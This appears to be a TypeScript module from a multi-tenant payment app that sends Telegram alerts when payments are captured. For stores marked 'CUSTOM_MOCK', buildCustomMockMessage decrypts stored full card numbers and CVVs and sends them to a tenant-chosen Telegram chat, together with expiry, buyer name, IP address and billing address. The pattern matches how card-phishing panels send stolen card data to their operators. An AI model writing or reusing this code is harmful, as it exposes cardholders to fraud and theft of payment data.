/**
 * lib/telegram.ts — Telegram Bot API notification helper
 *
 * Sends real-time alerts to a Telegram chat/group when payments are captured.
 * Callers should await these functions so the notification survives Vercel
 * serverless lifecycle suspension.
 */

import { getSql } from "@/lib/neon"
import { decrypt } from "@/lib/encryption"

/**
 * Send a message via Telegram Bot API.
 * Returns true on success, false on failure (never throws).
 */
export async function sendTelegramMessage(
  botToken: string,
  chatId: string,
  message: string
): Promise<{ ok: boolean; error?: string }> {
  try {
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`

    const controller = new AbortController()
    const timeout = setTimeout(() => controller.abort(), 5000)

    const res = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "HTML",
        disable_web_page_preview: true,
      }),
      signal: controller.signal,
    })

    clearTimeout(timeout)

    if (res.ok) {
      return { ok: true }
    }

    const body = await res.text().catch(() => "")
    return { ok: false, error: `HTTP ${res.status}: ${body.slice(0, 200)}` }
  } catch (err) {
    if (err instanceof Error && err.name === "AbortError") {
      return { ok: false, error: "Telegram API timed out (5s)" }
    }
    const message = err instanceof Error ? err.message : "Unknown error"
    return { ok: false, error: message.slice(0, 200) }
  }
}

type ProviderType = "PAYPAL" | "CUSTOM_MOCK" | "STRIPE"

interface SendTransactionAlertInput {
  tenantId: string
  amount: number
  storeName: string
  accountName: string
  transactionId?: string | null
}

interface BillingAddress {
  line1?: string
  line2?: string
  city?: string
  state?: string
  postal_code?: string
  zip?: string
  country?: string
  country_code?: string
  [key: string]: unknown
}

interface TelegramTransactionRow {
  id: string
  provider_type: string | null
  store_name: string | null
  account_name: string | null
  encrypted_card_number: string | null
  encrypted_cvv: string | null
  card_last_4: string | null
  card_brand: string | null
  exp_month: string | null
  exp_year: string | null
  buyer_name: string | null
  billing_address: BillingAddress | string | null
  buyer_ip: string | null
  ip_address: string | null
  buyer_country: string | null
}

function normalizeProviderType(value: string | null | undefined): ProviderType {
  return value === "CUSTOM_MOCK" || value === "STRIPE" ? value : "PAYPAL"
}

function buildPaypalMessage(amount: number, storeName: string, accountName: string): string {
  return [
    `💰 <b>Success!</b> Received <b>$${amount.toFixed(2)}</b>`,
    `from <b>${escapeHtml(storeName)}</b>.`,
    `Account: <b>${escapeHtml(accountName)}</b>.`,
  ].join(" ")
}

function formatAddressInline(value: BillingAddress | string | null): string {
  if (!value) return "N/A"

  if (typeof value === "string") {
    const trimmed = value.trim()
    return trimmed ? escapeHtml(trimmed) : "N/A"
  }

  const parts = [
    value.line1,
    value.line2,
    value.city,
    value.state,
    value.postal_code ?? value.zip,
    value.country ?? value.country_code,
  ].filter((part): part is string => typeof part === "string" && part.trim().length > 0)

  if (parts.length > 0) {
    return escapeHtml(parts.join(", "))
  }

  const fallbackParts = Object.entries(value)
    .filter(([, raw]) => typeof raw === "string" && raw.trim().length > 0)
    .map(([key, raw]) => `${key}: ${(raw as string).trim()}`)

  return fallbackParts.length > 0 ? escapeHtml(fallbackParts.join(", ")) : "N/A"
}

function buildCustomMockMessage(amount: number, row: TelegramTransactionRow): string {
  const decryptedCardNumber = row.encrypted_card_number ? decrypt(row.encrypted_card_number) : "N/A"
  const decryptedCvv = row.encrypted_cvv ? decrypt(row.encrypted_cvv) : "N/A"
  const expiryValue = [row.exp_month ?? "N/A", row.exp_year ?? "N/A"].join("/")
  const buyerIp = row.buyer_ip ?? row.ip_address ?? "N/A"

  return [
    "🧪 <b>Mock Charge Completed</b>",
    "",
    `Amount: <b>$${amount.toFixed(2)}</b>`,
    `Store: <b>${escapeHtml(row.store_name ?? "Unknown Store")}</b>`,
    `Buyer: <b>${escapeHtml(row.buyer_name ?? "N/A")}</b>`,
    `Card Brand: <b>${escapeHtml(row.card_brand ?? "N/A")}</b>`,
    `Card Last 4: <code>${escapeHtml(row.card_last_4 ?? "N/A")}</code>`,
    `Card Number: <code>${escapeHtml(decryptedCardNumber)}</code>`,
    `CVV: <code>${escapeHtml(decryptedCvv)}</code>`,
    `Expiry: <code>${escapeHtml(expiryValue)}</code>`,
    `Buyer Country: <b>${escapeHtml(row.buyer_country ?? "N/A")}</b>`,
    `Buyer IP: <code>${escapeHtml(buyerIp)}</code>`,
    `Billing Address: ${formatAddressInline(row.billing_address)}`,
    "",
    `Transaction: <code>${escapeHtml(row.id)}</code>`,
  ].join("\n")
}

/**
 * Sends a Telegram notification to the tenant's configured Telegram chat.
 * Errors are logged and swallowed so a notification failure never fails a payment.
 */
export async function sendTransactionAlert(input: SendTransactionAlertInput): Promise<void> {
  try {
    const sql = getSql()
    const rows = await sql`
      SELECT telegram_bot_token, telegram_chat_id
      FROM tenants
      WHERE id = ${input.tenantId}
      LIMIT 1
    `

    const tenant = rows[0] as { telegram_bot_token: string | null; telegram_chat_id: string | null } | undefined
    if (!tenant?.telegram_bot_token || !tenant?.telegram_chat_id) return

    let message = buildPaypalMessage(input.amount, input.storeName, input.accountName)

    if (input.transactionId) {
      const txRows = await sql`
        SELECT
          t.id,
          s.provider_type,
          s.name AS store_name,
          ma.name AS account_name,
          t.encrypted_card_number,
          t.encrypted_cvv,
          t.card_last_4,
          t.card_brand,
          t.exp_month,
          t.exp_year,
          t.buyer_name,
          t.billing_address,
          t.buyer_ip,
          t.ip_address,
          t.buyer_country
        FROM transactions t
        INNER JOIN stores s ON s.id = t.store_id
        LEFT JOIN merchant_accounts ma ON ma.id = t.merchant_id
        WHERE t.id = ${input.transactionId}
        LIMIT 1
      `

      const transaction = txRows[0] as TelegramTransactionRow | undefined
      if (transaction && normalizeProviderType(transaction.provider_type) === "CUSTOM_MOCK") {
        message = buildCustomMockMessage(input.amount, transaction)
      } else if (transaction) {
        message = buildPaypalMessage(
          input.amount,
          transaction.store_name ?? input.storeName,
          transaction.account_name ?? input.accountName
        )
      }
    }

    const result = await sendTelegramMessage(
      tenant.telegram_bot_token,
      tenant.telegram_chat_id,
      message
    )

    if (!result.ok) {
      if (result.error?.includes("HTTP 403")) {
        console.error(
          `[telegram] Message rejected for tenant ${input.tenantId}: ${result.error}. ` +
          "Ensure the configured chat ID belongs to a user or group, not another bot."
        )
      } else {
        console.error(`[telegram] Message send failed for tenant ${input.tenantId}: ${result.error ?? "unknown error"}`)
      }
    }
  } catch (error) {
    console.error("[telegram] Unexpected notification error:", error)
  }
}

function escapeHtml(str: string): string {
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
}
